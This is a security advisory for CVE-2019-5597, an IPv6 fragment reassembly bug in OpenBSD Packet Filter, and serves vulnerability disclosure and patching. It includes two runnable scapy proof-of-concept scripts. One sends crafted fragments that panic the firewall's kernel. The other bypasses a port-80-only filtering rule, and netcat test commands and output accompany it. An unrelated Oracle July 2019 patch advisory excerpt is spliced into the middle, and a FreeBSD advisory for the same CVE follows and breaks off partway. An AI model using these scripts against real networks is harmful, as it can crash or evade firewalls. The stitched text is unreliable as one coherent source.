CVE-2019-5597
IPv6 fragmentation vulnerability in
OpenBSD Packet Filter

Vulnerability description

Product description

Packet Filter is OpenBSD's  service for filtering network traffic and performing Network Address Translation. Packet Filter is
also capable of normalizing and conditioning TCP/IP traffic, as well as providing bandwidth control and packet prioritization.
Packet Filter has been a part of the GENERIC kernel since OpenBSD 5.0.

Because other BSD variants import part of OpenBSD code, Packet Filter is also shipped with at least the following
distributions that are affected in a lesser extent:

•

•

•

•

FreeBSD

pfSense

OPNSense

Solaris

Note that other distributions may also contain Packet Filter but due to the imported version they might not be vulnerable. This
advisory covers the latest OpenBSD’s Packet Filter. For specific details about other distributions, please refer to the advisory
of the affected product.

The issue

Unless IPv6 reassembly is explicitly disabled, Packet Filter reassembles IPv6 fragments to perform the filtering based on its
configuration. The packets are then re-fragmented to comply with the end-to-end nature of the IPv6 fragmentation.

When dealing with malicious fragmented IPv6 packets, the functions  pf_reassemble6()  and  pf_refragment6(), may use an
improper offset to apply a transformation on the packets. This behavior can have the following impacts:

•

•

A kernel panic can happen, effectively stopping the system;

An unexpected modification of the packets before and after the application of the filtering rules can occur. This may
be leveraged to bypass the rules under some circumstances (see Rule bypass p.10).

Note that with a GENERIC kernel, the panic drops to the debugger and does not reboot without a manual intervention.

Affected versions

Packet Filter from OpenBSD version 5.0 to 6.4.

Vendor response and security fix

OpenBSD was prompt to release the following security fix:

•

https://ftp.openbsd.org/pub/OpenBSD/patches/6.4/common/014_pf6frag.patch.sig

 2/13

Temporary workaround

If the official patch can not be applied, packet reassembly can be disabled by the following directive in the Packet Filter
configuration:

set reassemble no

Technical description and proof-of-concept

Technical description

1. IPv6 and fragmentation concepts

As a reminder, IPv6 has a fixed  sized header of 40 bytes. Within this header, the field  next_header specifies the type of the
following payload. Usually this identifies the transport layer such as TCP or UDP but it can also be used to indicate an IPv6
extension header. Indeed, IPv6 allows to “stack” various extensions within a chain as described in RFC8200. Each extension
has its own next_header field to identify the following one until the transport layer.

From the IPv6 extension headers set, Packet Filter will only decode the following ones:

•

•

•

•

Hop-by-Hop Options Header

Routing Header

Destination Option Header

Fragment Header

The three former extensions will be properly decoded by Packet Filter, but unless a specific rule allow them, they will be
discarded and the packet will be dropped. The fragment header contains an offset to identifies the start of the fragment within
the original packet as well as an id and a flag to denote whether this fragment is the last.

Also, note that Packet Filter will decode the Authentication  Header (AH) but without trying to check the integrity of the
payload (this will be useful later).

2. Fragmentation handling

From a high level point of view Packet Filter does the following when a fragmented IPv6 packet is received:

1. The packet and its extensions are decoded, with the detection of the Fragment header (pf_setup_pdesc());

2. The packet is put in a queue, waiting for the other fragments (pf_reassemble6() / pf_fillup_fragment()) ;

3.

Is this packet the last fragment and complete a queue ?

1.

If it is the case, then the whole packet is reassembled and the filtering logic is applied (pf_join_fragment())

2. Otherwise, the packet stays in the queue

If a reconstructed packet is allowed to pass and go out, it is re-fragmented by Packet Filter to comply with the end-to-end
nature of the IPv6 fragmentation.

The implementation of the fragment reassembly is done within the function:

int pf_reassemble6(struct mbuf **m0, struct ip6_frag *fraghdr, u_int16_t hdrlen, u_int16_t
extoff, int dir, u_short *reason);

 4/13

To represents each fragment, Packet Filer uses the pf_frent structure:

struct pf_frent {

TAILQ_ENTRY(pf_frent) fr_next;
struct mbuf
u_int16_t

*fe_m;
 fe_hdrlen;

u_int16_t
u_int16_t
u_int16_t
u_int16_t

 fe_extoff;
 fe_len;
 fe_off;
 fe_mff;

};

/* ipv4 header length with ip options
   ipv6, extension, fragment header */
/* last extension header offset or 0 */
/* fragment length */
/* fragment offset */
/* more fragment flag */

For this vulnerability the interesting members are fe_hdrlen  and  fe_extoff.  fe_hdrlen  corresponds to the length of the IPv6
header plus the lengths of the extensions before the fragment header and  fe_extoff represents  the offset of the extension
preceding the fragment header.

According to RFC8200, Packet Filter reconstructs the original packet by doing the following in pf_join_fragment():

1.

It starts with the first fragment (with the offset 0) and its headers;

2. For each of the following packets:

1. The headers of the packet are stripped until fe_hdrlen

2. The reminder of the packet is concatenated with the reassembled one.

3. The fragment extension of the first packet, which is still here, is removed.

During the last step, it is important to update the extension which preceded the fragmentation header. Its  next_header has to
match the type of the new following extension (because the fragment header is now stripped). This  task is done thanks to
fe_off and fe_hdrlen. The following illustration described the reconstruction of two fragmented packets :

Figure 1: IPv6 fragment reassembly

 5/13

3. Vulnerability details

A vulnerability exists in the implementation of the last step of the described logic, where the next_header of the first packet is
patched once the fragment header is stripped.

To determine the new value of that member (TCP in the example), Packet Filter will extract the protocol from the fragment
extension. Its location is known thanks to  fe_hdrlen  of the  struct pf_frent  of  the first packet. But to understand where to
patch (Ext2 in the example), Packet Filer uses fe_extoff of the struct pf_frent  of the last received packet.

This implementation is correct when all the packets have the same extension headers (which is how the fragmentation must
be done). But with malicious packets, the last received fragment might have more or fewer extensions, in this case Packet
Filter ends up patching the packet at a wrong place.

Here is the annotated code containing the vulnerability:

int pf_reassemble6( /* ... */)
{

// ...
struct pf_frent
// ...

*frent;

/* Get an entry for the fragment queue */
if ((frent = pf_create_fragment(reason)) == NULL) // <-- (1)

return (PF_DROP);

frent->fe_m = m; // <-- (2)
frent->fe_hdrlen = hdrlen;
frent->fe_extoff = extoff;
frent->fe_len = sizeof(struct ip6_hdr) + ntohs(ip6->ip6_plen) - hdrlen;
frent->fe_off = ntohs(fraghdr->ip6f_offlg & IP6F_OFF_MASK);
frent->fe_mff = fraghdr->ip6f_offlg & IP6F_MORE_FRAG;

// ...
if ((frag = pf_fillup_fragment(&key, fraghdr->ip6f_ident, frent, reason)) == NULL) { // <-- (3)

// ...
return (PF_DROP);

}

// ...
if (frag->fr_holes) {
// ... <-- (4)
return (PF_PASS);

}

/* We have all the data */ // <-- (5)
extoff = frent->fe_extoff; // <-- (6)
maxlen = frag->fr_maxlen;

frent = TAILQ_FIRST(&frag->fr_queue); // <-- (7)
KASSERT(frent != NULL);
total = TAILQ_LAST(&frag->fr_queue, pf_fragq)->fe_off + TAILQ_LAST(&frag->fr_queue, pf_fragq)-

>fe_len;

hdrlen = frent->fe_hdrlen - sizeof(struct ip6_frag);
m = *m0 = pf_join_fragment(frag);
frag = NULL;

/* Take protocol from first fragment header */
if ((m = m_getptr(m, hdrlen + offsetof(struct ip6_frag, ip6f_nxt), &off)) == NULL) // <-- (8)

panic("%s: short frag mbuf chain", __func__);

proto = *(mtod(m, caddr_t) + off);
m = *m0;

// ...

ip6 = mtod(m, struct ip6_hdr *);
ip6->ip6_plen = htons(hdrlen - sizeof(struct ip6_hdr) + total);

 6/13

if (extoff) { // <-- (9)
    /* Write protocol into next field of last extension header */
    if ((m = m_getptr(m, extoff + offsetof(struct ip6_ext, ip6e_nxt), &off)) == NULL) //<--(10)
        panic("%s: short ext mbuf chain", __func__);

           *(mtod(m, caddr_t) + off) = proto; // <-- (11)

    m = *m0;
} else
    ip6->ip6_nxt = proto;  // <-- (12)

// ...

1 and 2: frent is initialized from the packet PF has just received

3: frent is added to a fragment queue, waiting for the other fragments to arrive.

4: if all the fragments are not received yet, the execution ends up in this.

5: Otherwise the executions continues at this point.

6: extoff is initialized from frent→fe_extoff, which is the last fragment PF has received (and not the first one)

7: frent now represents the first fragment.

8: based on hdrlen (of the first fragment), PF finds the next header type (TCP in the example).

9 and 10: Based on extoff PF find the offset, within the packet m_buf, where to update the next_header. This should
mean the one before the fragment header (Ext2 in the example), but this is not guaranteed with malicious packets.

11: The byte at the previous offset is patched.

12: If no IPv6 extension other than the fragment one was in the last received packet, then the IPv6 fixed header is
patched instead.

Here is an example of a fragmentation that will trigger the vulnerability:

Figure 2: Example of a malicous IPv6 fragmentation wrongfully handled by PF

 7/13

At this point if the fe_extoff of the last packet is large enough to be outside the pkt0 mbuf then the second m_getptr() (see
step 10) will fail and the panic() executed. In the other case, the packet is patched, and the execution continues. Note that
after this, the packet will most likely still be considered as fragmented because the wrong next_header update failed to patch
the identification of the now removed fragment header.

The modification of the packet can be applied before or after the original fragment header and, under some circumstances it
can change the interpretation Packet Filter has of the packet.

Later on, if this packet is allowed to pass by the rules, the re-fragmentation process in pf_refragment6() applies the opposite
transformation based on the same offsets:

•

•

fe_hdrlen of the first packet is used to insert a new fragmentation header

fe_extoff of the last received packet is used to update the next_header to IPPROTO_FRAGMENT (44)

Proof of concept

1. Kernel Panic

The idea is to construct a fragmentation with a first packet without, or with only few extensions and a last packet with a long
chain of them.

Figure 4: A malicious fragmentation that causes a kernel panic
To construct such packets, stacking AH extension seems the easiest way as they are decoded by Packet Filter and have a
controlled length. The following python script does so with the wonderful scapy library.

from scapy.all import *
import random

UDP_PROTO  = 17
AH_PROTO   = 51
FRAG_PROTO = 44

fid =random.randint(0,100000)

ipv6_dst  = "2002::10" # the target
ipv6_from = "2001::10" # the sender
ipv6_main = IPv6(dst=ipv6_dst, src=ipv6_from)

padding_pkt0 = 8
padding_pkt1 = 8

frag_0 = IPv6ExtHdrFragment(id=fid, nh=UDP_PROTO, m=1, offset=0)
frag_1 = IPv6ExtHdrFragment(id=fid, nh=UDP_PROTO, m=0, offset=padding_pkt0/8)

pkt1_opts = AH(nh=AH_PROTO, payloadlen=200)/Raw('XXXX' * 199)/AH(nh=FRAG_PROTO,
payloadlen=1)/frag_1

pkt0 = ipv6_main/frag_0/Raw('A'*padding_pkt0)
pkt1 = ipv6_main/pkt1_opts/Raw('B'*padding_pkt1)

 9/13

send(pkt0)
send(pkt1)

This results in the following panic

Figure 5: A panic in pf_reassemble6 caused by malicious packets

2. Rule bypass

Quick disclaimer: the following aims to demonstrate that the vulnerability may be used to insert inconsistencies that can be
leveraged to bypass a filtering rule to reach a filtered port on a remote host. The described technique will indeed bypass the
rule but the constructed packets will be most likely  rejected by the remote host. Therefore, the explained attack is not
practicable. However, it is unknown if another generic attack is possible.

In the following, we will only demonstrate the attack to bypass a rule that only allows to reach a web server on the port 80.
The objective is to try to send a TCP packet on its port 1000. Packet Filter is deployed as a firewall with a configuration
limited to:

block all
pass in  proto tcp to webserver port 80
pass out proto tcp to webserver port 80

To bypass a rule with the vulnerability, the idea is the following:

•

•

Construct a specific packet that is allowed to pass in;

Then to take advantage of the patch at the re-fragmentation step to change the interpretation of the packet.

To  achieve   an  interpretation  change,   a  possibility  is  to  patch   a  next_header  field  of   an  extension.  This  will  modify  the
following extension type from a legitimate one into a fragment (because at the re-fragmentation stage, it is only possible to
patch   with   IPPROTO_FRAGMENT:   44).   So,   an   extension   header   must   be   built   in   such   way   that   it   is   also   valid   when
considered as a fragment. The most obvious choice to do so is, once again AH, because its header can overlap quite well
with the fragment headers. Here are the descriptions of both headers:

 10/13

Header type

Byte 0

Byte 1

Byte 2

Byte 3

Byte 4

Byte 5

Byte 6

Byte 7

AH

Frag

next_header

Len

Reserved

Reserved

next_header Reserved Offset

Offset +
flags

SPI

ID

SPI

ID

SPI

ID

SPI

ID

The AH header length stacks with a reserved byte in the fragment header and so does the offset+flag bytes of the fragment
header with the reserved bytes of the AH’s one. So without much trouble it is possible to have a header that is considered
valid with both types. Using this fact, the next illustration shows a way to construct a packet which interpretation will change
post-filtering. It uses two AH extensions that can also be interpreted as a fragment extension and still be valid.

Figure 6: Construction of an attack that will bypass a Packet Filter rule

 11/13

With the described construction, Packet Filter will see a Packet going on the port 80 when the remote host will see two
atomic fragments, followed by an AH extension and a TCP payload on the port 1000. Here is the python script to produce
those packets:

from scapy.all import *
import time

TCP_PROTO = 6
AH_PROTO = 51
FRAG_PROTO = 44
fid  = random.randint(0,0xffff)
fid2 = random.randint(0,0xffff)
fid3 = random.randint(0,0xffff)

ipv6_dst = "2002::10" # remote host
ipv6_src = "2001::10" # sender

pkt0_ip6 = IPv6(src=ipv6_src, dst=ipv6_dst)
pkt1_ip6 = IPv6(src=ipv6_src, dst=ipv6_dst)

pkt0_frag = IPv6ExtHdrFragment(id=fid, nh=AH_PROTO, m=1, offset=0)

fake_opt_size = 64
assert((fake_opt_size % 8) == 0)

fake_ah1 = IPv6ExtHdrFragment(id=fid2, nh=AH_PROTO, m=0, res1=fake_opt_size/8,
offset=0)/AH(nh=TCP_PROTO, payloadlen=1)/TCP(sport=0x1234, dport=1000)
fake_ah2 = IPv6ExtHdrFragment(id=fid3, nh=TCP_PROTO, offset=0)
pkt0_opt = fake_ah1/AH(nh=FRAG_PROTO, payloadlen=1)/pkt0_frag/fake_ah2
pkt0_ip6.nh = AH_PROTO

offset_frag1 = 48
assert((offset_frag1 % 8) == 0)

pkt0_payload = TCP(sport=0x7788, dport=80)/Raw("A" * 20)
pkt0 = pkt0_ip6/pkt0_opt/pkt0_payload

pkt1_frag = IPv6ExtHdrFragment(id=fid, nh=TCP_PROTO, m=0, offset=offset_frag1/8)
pkt1_payload = Raw("B" * 20)

pkt1 = pkt1_ip6/pkt1_frag/pkt1_payload

send(pkt0)
send(pkt1)

The attack can be tested with the following:

Setup of the listening services on the target:

(target) $ nc -n -v -l 80 & nc -n -v -l 1000 &
(target) $ tcpdump

Check that only the 80 port is reachable.

(sender) $ nc -n -v 2002::10 80
Connection to 2002::10 80 port [tcp/*] succeeded!
^C
(sender) $ nc -n -v 2002::10 1000 -w1
nc: connect to 2002::10 port 1000 (tcp) timed out: Operation now in progress

Attack:

(sender) $ python frag_ipv6_bypass.py

Sent 1 packets.

We notice that two packets are received on the target with atomic fragments, AH headers but on the port 1000:

IP6 2001::10 > 2002::10: frag (0|100) AH(spi=0x00000000,seq=0x0): 4660 > 1000: Flags [S],
seq 0:68, win 8192, length 68
IP6 2002::10 > 2001::10: ICMP6, parameter problem, next header - octet 40, length 156
IP6 2001::10 > 2002::10: frag (0|72) AH(spi=0x00000000,seq=0x0): 4660 > 1000: Flags [S],
seq 0:40, win 8192, length 40
IP6 2002::10 > 2001::10: ICMP6, parameter problem, next header - octet 40, length 128

However, as explained on the disclaimer, our construction implies an AH header in the resulting packets. This causes the
packets to be rejected at the end (with an emission of an ICMPv6 error on a linux IPv6 stack). That being said, this is
considered as good enough for a Proof of Concept of a rule bypass.

# Oracle Critical Patch Update Advisory - July 2019

## Oracle Critical Patch Update Advisory - July 2019

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities. Critical Patch Update patches are usually cumulative, but each advisory describes only the security fixes added since the previous Critical Patch Update advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security fixes. Please refer to:

* [Critical Patch Updates, Security Alerts and Bulletins](/security-alerts/) for information about Oracle Security Advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released fixes. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update fixes without delay.**

This Critical Patch Update contains 319 new security fixes across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [July 2019 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2559985.1).

 **Please note that since the release of the April 2019 Critical Patch Update, Oracle has released two Security Alerts for Oracle WebLogic Server:  [CVE-2019-2725 (April 29, 2019)](/security-alerts/alert-cve-2019-2725.html) and  [CVE-2019-2729 (June 18, 2019)](/security-alerts/alert-cve-2019-2729.html). WebLogic Server customers are strongly advised to apply the fixes contained in this Critical Patch Update, which provides the fixes for the previously-released Alerts as well as additional fixes.**

#### Note:

* Vulnerabilities affecting Oracle Database and Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2160904.1) for information on minimum revisions of security fixes required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Users running Java SE with a browser can download the latest release from <http://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly fixed by the patches associated with this advisory. Risk matrices for previous security fixes can be found in [previous Critical Patch Update advisories and Alerts](/security-alerts/). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpujul2019verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is a unique identifier for a vulnerability. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.0 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.0).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](/corporate/security-practices/assurance/vulnerability/disclosure.html).

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update fixes as soon as possible**. Until you apply the Critical Patch Update fixes, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security fixes as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security fixes announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](/security-alerts/) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](//www.oracle.com/support/lifetime-support/). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=209768.1). Please review the [Technical Support Policies](//www.oracle.com/support/policies.html) for further guidelines regarding support policies and phases of support.

### Oracle Java SE Risk Matrix

This Critical Patch Update contains 10 new security fixes for Oracle Java SE.  9 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here](/security-alerts/cpujul2019verbose.html#JAVA).

The CVSS scores below assume that a user running a Java applet or Java Web Start application (in Java SE 8) has administrator privileges (typical on Windows). When the user does not run with administrator privileges (typical on Solaris and Linux), the corresponding CVSS impact scores for Confidentiality, Integrity, and Availability are "Low" instead of "High", lowering the CVSS Base Score. For example, a Base Score of 9.6 becomes 7.1.

=============================================================================
FreeBSD-SA-19:05.pf Security Advisory
The FreeBSD Project
Topic: IPv6 fragment reassembly panic in pf(4)
Category: contrib
Module: pf
Announced: 2019-05-14
Credits: Synacktiv
Affects: All supported versions of FreeBSD
Corrected: 2019-03-01 18:12:05 UTC (stable/12, 12.0-STABLE)
2019-05-14 23:10:21 UTC (releng/12.0, 12.0-RELEASE-p4)
2019-03-01 18:12:07 UTC (stable/11, 11.3-PRERELEASE)
2019-05-14 23:10:21 UTC (releng/11.2, 11.2-RELEASE-p10)
CVE Name: CVE-2019-5597
For general information regarding FreeBSD Security Advisories,
including descriptions of the fields above, security branches, and the
following sections, please visit .
I. Background
pf(4) is an Internet Protocol packet filter originally written for OpenBSD.
In addition to filtering packets, it also has packet normalization
capabilities.
II. Problem Description
A bug in the pf(4) IPv6 fragment reassembly logic incorrectly uses the last
extension header offset from the last received packet instead of from the
first packet.
III. Impact
Malicious IPv6 packets with different IPv6 extensions could cause a kernel
panic or potentially a filtering rule bypass.
IV. Workaround
Only systems leveraging the pf(4) firewall and include packet scrubbing using
the recommended 'scrub all in' or similar are affected.
V. Solution
Perform one of the following:
1) Upgrade your vulnerable system to a supported FreeBSD stable or
release / security branch (releng) dated after the correction date.
Afterwards, reboot the system.
2) To update your vulnerable system via a binary patch:
Systems running a RELEASE version of FreeBSD on the i386 or amd64
platforms can be updated via the freebsd-update(8) utility:
# freebsd-update fetch
# freebsd-update install
Afterwards, reboot the system.
3) To update your vulnerable system via a source code patch:
The following patches have been verified to apply to the applicable
FreeBSD release branches.
a) Download the relevant patch from the location below, and verify the
detached PGP signature using your PGP utility.
# fetch https://security.FreeBSD.org/patches/SA-19:05/pf.patch
# fetch https://security.FreeBSD.org/patches/SA-19:05/pf.patch.asc
# gpg --verify pf.patch.asc
b) Apply the patch. Execute the following commands as root:
# cd /usr/src
# patch < /path/to/patch
c) Recompile your kernel as described in
 and reboot the
system.
VI. Correction details
The following list contains the correction revision numbers for each
affected branch.
